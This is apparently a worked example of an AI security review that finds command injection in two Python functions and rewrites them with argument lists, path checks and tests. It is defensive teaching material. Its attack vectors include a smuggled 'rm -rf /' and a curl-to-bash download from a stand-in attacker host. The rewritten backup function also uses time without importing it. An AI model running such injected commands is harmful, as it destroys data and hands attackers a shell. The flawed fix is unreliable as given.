# Example: Command Injection Analysis & Remediation

## User Request

```
Проанализируй этот Python код на уязвимости:

import os
import subprocess

def process_image(filename):
    # Resize image using ImageMagick
    command = f"convert {filename} -resize 800x600 output_{filename}"
    os.system(command)
    return f"Processed: {filename}"

def backup_file(filepath):
    backup_cmd = "tar -czf backup.tar.gz " + filepath
    subprocess.call(backup_cmd, shell=True)
```

## Reasoning

**Domain:** Security (command injection vulnerability analysis)
**Complexity:** Medium (requires security expertise + secure coding patterns)
**Model:** Sonnet (security-critical analysis)

**Analysis steps:**
1. Identify all external input points (filename, filepath parameters)
2. Check command construction methods (string interpolation, concatenation)
3. Identify dangerous functions (os.system, subprocess with shell=True)
4. Assess injection risk (user-controlled input in commands)
5. Provide secure alternatives with proper escaping/validation

## Response

### 🔴 Critical Vulnerabilities Detected

#### Vulnerability 1: Command Injection in `process_image()`
**Location:** `os.system(command)` with f-string interpolation
**Risk:** **CRITICAL** (RCE - Remote Code Execution)

**Attack Vector:**
```python
# Attacker input:
filename = "test.jpg; rm -rf / #"

# Resulting command:
"convert test.jpg; rm -rf / # -resize 800x600 output_test.jpg; rm -rf / #"
# This executes: convert test.jpg; rm -rf /
```

**Impact:**
- Arbitrary command execution
- File system destruction
- Data exfiltration
- Privilege escalation

---

#### Vulnerability 2: Command Injection in `backup_file()`
**Location:** `subprocess.call(backup_cmd, shell=True)` with string concatenation
**Risk:** **CRITICAL** (RCE)

**Attack Vector:**
```python
# Attacker input:
filepath = "/tmp/data.txt && curl http://attacker.com/shell.sh | bash"

# Resulting command:
"tar -czf backup.tar.gz /tmp/data.txt && curl http://attacker.com/shell.sh | bash"
# This creates backup AND downloads+executes malicious script
```

---

### ✅ Secure Implementation

```python
import os
import subprocess
import shlex
from pathlib import Path
import re

def process_image(filename: str) -> str:
    """
    Securely process image using ImageMagick.

    Defense layers:
    1. Input validation (whitelist allowed characters)
    2. Path sanitization (prevent directory traversal)
    3. Subprocess without shell (no command injection)
    4. Argument array (no string parsing)
    """
    # Layer 1: Validate filename format
    if not re.match(r'^[a-zA-Z0-9_\-\.]+$', filename):
        raise ValueError(f"Invalid filename: {filename}")

    # Layer 2: Ensure file exists and is in allowed directory
    allowed_dir = Path("/var/uploads")
    file_path = (allowed_dir / filename).resolve()

    if not file_path.is_relative_to(allowed_dir):
        raise ValueError("Path traversal attempt detected")

    if not file_path.exists():
        raise FileNotFoundError(f"File not found: {filename}")

    # Layer 3: Use subprocess with argument array (NO SHELL)
    output_path = allowed_dir / f"output_{filename}"

    result = subprocess.run(
        [
            "convert",
            str(file_path),
            "-resize", "800x600",
            str(output_path)
        ],
        shell=False,  # CRITICAL: Never use shell=True with user input
        capture_output=True,
        text=True,
        timeout=30  # Prevent DoS via long-running commands
    )

    if result.returncode != 0:
        raise RuntimeError(f"ImageMagick error: {result.stderr}")

    return f"Processed: {filename}"


def backup_file(filepath: str) -> str:
    """
    Securely create backup archive.

    Defense layers:
    1. Path validation (whitelist allowed directories)
    2. Path canonicalization (prevent traversal)
    3. Subprocess without shell
    4. Argument array with proper escaping
    """
    # Layer 1: Validate path is in allowed backup directory
    allowed_backup_dirs = [
        Path("/var/backups"),
        Path("/home/user/data")
    ]

    file_path = Path(filepath).resolve()

    # Check if path is within any allowed directory
    if not any(file_path.is_relative_to(allowed) for allowed in allowed_backup_dirs):
        raise ValueError(f"Backup path not in allowed directories: {filepath}")

    if not file_path.exists():
        raise FileNotFoundError(f"File not found: {filepath}")

    # Layer 2: Create safe backup filename
    backup_name = f"backup_{file_path.name}_{int(time.time())}.tar.gz"
    backup_path = Path("/var/backups") / backup_name

    # Layer 3: Use subprocess with argument array (NO SHELL)
    result = subprocess.run(
        [
            "tar",
            "-czf",
            str(backup_path),
            str(file_path)
        ],
        shell=False,  # CRITICAL: No shell interpretation
        capture_output=True,
        text=True,
        timeout=300,
        cwd=file_path.parent  # Set working directory safely
    )

    if result.returncode != 0:
        raise RuntimeError(f"Backup failed: {result.stderr}")

    return f"Backup created: {backup_path}"
```

---

### 🛡️ Security Controls Summary

| Control | Vulnerable Code | Secure Code |
|---------|----------------|-------------|
| **Input Validation** | ❌ None | ✅ Regex whitelist + path checks |
| **Command Execution** | ❌ `os.system()`, `shell=True` | ✅ `subprocess.run()` with `shell=False` |
| **Argument Passing** | ❌ String interpolation/concatenation | ✅ Argument array (list) |
| **Path Traversal** | ❌ No sanitization | ✅ `.resolve()` + `.is_relative_to()` |
| **Error Handling** | ❌ None | ✅ Exceptions with safe error messages |
| **DoS Prevention** | ❌ No timeout | ✅ `timeout=N` parameter |

---

### 📚 Key Principles

1. **Never use `shell=True`** with user-controlled input
2. **Always pass arguments as list**, not as concatenated string
3. **Validate input** with strict whitelists (regex, allowed values)
4. **Sanitize paths** with `.resolve()` and directory checks
5. **Use timeouts** to prevent resource exhaustion
6. **Log security events** for audit trail

---

### 🔍 Testing the Fix

```python
# Test 1: Normal usage
assert process_image("photo.jpg") == "Processed: photo.jpg"

# Test 2: Injection attempt (should raise ValueError)
try:
    process_image("test.jpg; rm -rf /")
    assert False, "Should have raised ValueError"
except ValueError as e:
    assert "Invalid filename" in str(e)

# Test 3: Path traversal attempt
try:
    process_image("../../etc/passwd")
    assert False, "Should have raised ValueError"
except ValueError as e:
    assert "Path traversal" in str(e) or "Invalid filename" in str(e)
```

---

## Key Takeaways

1. **Command injection is CRITICAL** — treat all external input as malicious
2. **`shell=True` is almost always wrong** — use argument arrays instead
3. **Defense in depth** — combine validation, sanitization, and safe APIs
4. **Whitelist > Blacklist** — validate what's allowed, not what's forbidden
5. **Test security fixes** — verify both normal usage and attack scenarios

**OWASP Reference:** A03:2021 – Injection
**CWE:** CWE-78 (OS Command Injection)
**CVSSv3 Score:** 9.8 (Critical)
